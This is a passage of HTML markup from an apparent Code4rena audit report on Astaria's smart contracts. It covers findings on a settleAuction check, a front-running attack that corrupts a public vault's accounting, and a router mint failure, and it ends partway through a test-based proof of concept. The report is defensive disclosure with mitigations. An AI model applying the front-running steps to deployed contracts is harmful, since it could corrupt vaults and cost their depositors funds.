class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">idToUnderlying</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ) == </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">]</span></span></span></code></pre>\n<p>This causes ClearingHouse.safeTransferFrom() to execute successfully even if there is no bid.</p>\n<h3 id=\"recommended-mitigation-steps-20\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-20\" aria-label=\"recommended mitigation steps 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">settleAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-     </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralIdToAuction</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">] == </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-    </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">idToUnderlying</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">).</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-        </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">idToUnderlying</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-      ) !=</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralIdToAuction</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">] == </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) || </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+       </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">idToUnderlying</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">).</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">idToUnderlying</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      ) == </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidCollateralState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidCollateralStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">NO_AUCTION</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/582\">androolloyd (Astaria) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/582#issuecomment-1439153219\">Picodes (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Keeping medium severity despite the lack of clear impact, the lack of clear impact being due to flaws in the flow before these lines.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-04-lientokentransferfrom-there-is-a-possibility-of-malicious-attack\" style=\"position:relative;\"><a href=\"#m-04-lientokentransferfrom-there-is-a-possibility-of-malicious-attack\" aria-label=\"m 04 lientokentransferfrom there is a possibility of malicious attack permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/571\">[M-04] <code>LienToken.transferFrom</code> There is a possibility of malicious attack</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/571\">bin2chen</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L366-L368\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L366-L368</a></p>\n<p>Corrupt multiple key properties of public vault, causing vault not to function properly.</p>\n<h3 id=\"proof-of-concept-22\" style=\"position:relative;\"><a href=\"#proof-of-concept-22\" aria-label=\"proof of concept 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When LienToken.makePayment()/buyoutLien()/payDebtViaClearingHouse()<br>\nIf it corresponds to PublicVault, it will make multiple changes to the vault, such as: yIntercept, slope, last, epochData, etc.</p>\n<p>If LienToken corresponds to PublicVault, then ownerOf(lienId) = PublicVault address</p>\n<p>When the LienToken is a private vault, it is possible to transfer the owner of the LienToken.</p>\n<p>As the above seems, if the private vault is transferred to the PublicVault address will result in the wrong modification of the yIntercept, slope, last, epochData, etc.</p>\n<p>So we restrict the to in transferFrom to not be a PublicVault address</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ERC721</span><span class=\"mtk1\">, </span><span class=\"mtk12\">IERC721</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">_isPublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">)) {  </span><span class=\"mtk3\">//***@audit when to == PublicVault address , will revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">PUBLIC_VAULT_RECIPIENT</span><span class=\"mtk1\">);  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }  </span></span></span></code></pre>\n<p>However, such a restriction does not prevent an attacker from transferring PrivateVault’s LienToken to PublicVault.<br>\nBecause the address is predictable when the vault contract is created, a malicious user can predict the vault address, front-run, and transfer PrivateVault’s LienToken to the predicted PublicVault address before the public vault is created, thus bypassing this restriction</p>\n<p>Assumptions:</p>\n<ol>\n<li>alice creates PrivateVault, and creates multiple PrivateVault’s LienToken</li>\n<li>alice monitors bob’s creation of the PublicVault transaction, i.e., AstariaRouter.newPublicVault(), and then predicts the address of the newly generated treasure chest</li>\n</ol>\n<p>Note: newPublicVAult() although the use of create(), but still can predict the address</p>\n<p>see：<a href=\"https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed\">https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed</a></p>\n<blockquote>\n<p>The address for an Ethereum contract is deterministically computed from the address of its creator (sender) and how many transactions the creator has sent (nonce). The sender and nonce are RLP encoded and then hashed with Keccak-256.</p>\n</blockquote>\n<ol start=\"3\">\n<li>front-run , and transfer LienToken to public vault predict address</li>\n<li>bob’s public vault created success and do some loan</li>\n<li>alice do makePayment() to Corrupt bob’s public vault</li>\n</ol>\n<h3 id=\"recommended-mitigation-steps-21\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-21\" aria-label=\"recommended mitigation steps 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The corresponding vault address is stored in s.lienMeta[id].orginOwner when the LienToken is created, this is not modified. Get the vault address from this variable, not from ownerOf(id).</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/571\">androolloyd (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-05-users-are-unable-to-mint-shares-from-a-public-vault-using-astariarouter-contract-when-share-price-is-bigger-than-one\" style=\"position:relative;\"><a href=\"#m-05-users-are-unable-to-mint-shares-from-a-public-vault-using-astariarouter-contract-when-share-price-is-bigger-than-one\" aria-label=\"m 05 users are unable to mint shares from a public vault using astariarouter contract when share price is bigger than one permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/488\">[M-05] Users are unable to mint shares from a public vault using <code>AstariaRouter</code> contract when share price is bigger than one</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/488\">rbserver</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/596\">adriro</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/484\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/227\">cccz</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/168\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/118\">chaduke</a>, and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/59\">rvierdiiev</a></em></p>\n<p>For a public vault, calling the <code>AstariaRouter.mint</code> function calls the following <code>ERC4626RouterBase.mint</code> function and then the <code>ERC4626Cloned.mint</code> function below. After user actions like borrowing and repaying after some time, the public vault’s share price can become bigger than 1 so <code>ERC4626Cloned.previewMint</code> function’s execution of <code>shares.mulDivUp(totalAssets(), supply)</code> would return <code>assets</code> that is bigger than <code>shares</code>; then, calling the <code>ERC4626Cloned.mint</code> function would try to transfer this <code>assets</code> from <code>msg.sender</code> to the public vault. When the <code>AstariaRouter.mint</code> function is called, this <code>msg.sender</code> is the <code>AstariaRouter</code> contract. However, because the <code>AstariaRouter.mint</code> function only approves the public vault for transferring <code>shares</code> of the asset token on behalf of the router, the <code>ERC4626Cloned.mint</code> function’s transfer of <code>assets</code> of the asset token would fail due to the insufficient asset token allowance. Hence, when the public vault’s share price is bigger than 1, users are unable to mint shares from the public vault using the <code>AstariaRouter</code> contract and cannot utilize the slippage control associated with the <code>maxAmountIn</code> input.</p>\n<p><a href=\"https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626RouterBase.sol#L15-L25\">https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626RouterBase.sol#L15-L25</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IERC4626</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxAmountIn</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeApprove</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">), </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> ((</span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">shares</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">)) &gt; </span><span class=\"mtk12\">maxAmountIn</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MaxAmountError</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><a href=\"https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626-Cloned.sol#L38-L52\">https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626-Cloned.sol#L38-L52</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">assets</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">previewMint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">shares</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// No need to check for rounding error, previewMint rounds up.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">minDepositAmount</span><span class=\"mtk1\">(), </span><span class=\"mtk8\">&quot;VALUE_TOO_SMALL&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Need to transfer before minting or ERC777s could reenter.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Deposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">afterDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><a href=\"https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626-Cloned.sol#L129-L133\">https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626-Cloned.sol#L129-L133</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">previewMint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// Saves an extra SLOAD if totalSupply is non-zero.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> ? </span><span class=\"mtk7\">10e18</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDivUp</span><span class=\"mtk1\">(</span><span class=\"mtk11\">totalAssets</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">supply</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-23\" style=\"position:relative;\"><a href=\"#proof-of-concept-23\" aria-label=\"proof of concept 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Please add the following test in <code>src\\test\\AstariaTest.t.sol</code>. This test will pass to demonstrate the described scenario.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testUserFailsToMintSharesFromPublicVaultUsingRouterWhenSharePriceIsBiggerThanOne</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">50</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">alice</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span 